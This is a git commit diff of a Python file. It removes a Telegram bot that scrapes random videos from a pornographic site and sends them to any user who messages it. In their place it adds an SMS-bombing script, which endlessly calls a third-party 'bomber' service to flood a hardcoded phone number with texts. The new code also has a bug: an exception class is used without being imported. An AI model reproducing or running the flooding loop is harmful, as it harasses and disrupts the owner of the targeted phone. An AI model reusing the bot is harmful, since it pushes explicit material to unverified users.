bc3489bb8a81265e7819c3a6c9b508660cb1e780
PRAPTI220098 <140289767+PRAPTI220098@users.noreply.github.com>
2024-02-17 21:14:11 +0530

    Update main.py

--- main.py
+++ main.py
@@ -1,25 +1,18 @@
-from requests import *;import os,re,random,telebot,time;from user_agent import generate_user_agent;from hh import keep_alive
-tk=os.environ.get('TOK')
-bot = telebot.TeleBot(tk)
-@bot.message_handler(commands=['start'])
-def s(message):
-      u = message.from_user.first_name
-      t=f"Hello [{u}](tg://settings),\n\n*Welcome To Magic Viewer Bot*\n\n_If You Want To Use The Bot Then Just Send Any Mesage..._"
-      bot.send_message(message.chat.id, text=t, parse_mode='markdown')
-@bot.message_handler(func=lambda m: True)
-def v(message):
-    u = message.from_user.first_name
-    w = bot.send_message(message.chat.id, text=f"Hey [{u}](tg://settings),\n_Wait We Are Sending A Magic Video In Few Seconds..._", parse_mode='markdown')    
-    num_digits = random.randint(2, 6)
-    num = ''.join(random.choice('0123456789') for _ in range(num_digits))
-    s = get("https://tik.porn/video/" + num).text
-    print(num)    
-    m = re.search(r'"downloadLink":"(https://[^"]+)"', s)
-    time.sleep(3)    
-    if m:
-        u= m.group(1)
-        time.sleep(2)
-        bot.delete_message(message.chat.id, w.message_id)
-        bot.send_video(message.chat.id, u, caption="Dev: [SANCHIT](tg://settings)",parse_mode='markdown')
+import requests,secrets
+from hh import keep_alive
+kk="7067616341"
+m="HOPING YOU HIT 95% ON EXAMS! 💕"
+ll=0
+while True:
+	try:
+		l=secrets.token_hex(6)
+		res=requests.get(f"https://mbomber.onrender.com/customsms/{kk}/antitoolz/{l}/{m}").text
+		if 'success' in res:
+			ll +=1
+			print(f"Done Sended –—–⟩⟩ {ll}")
+		else:
+			print("Error")
+	except RequestException:
+		print("Are Net Toh On Kar")
 keep_alive()
-bot.polling()
+	
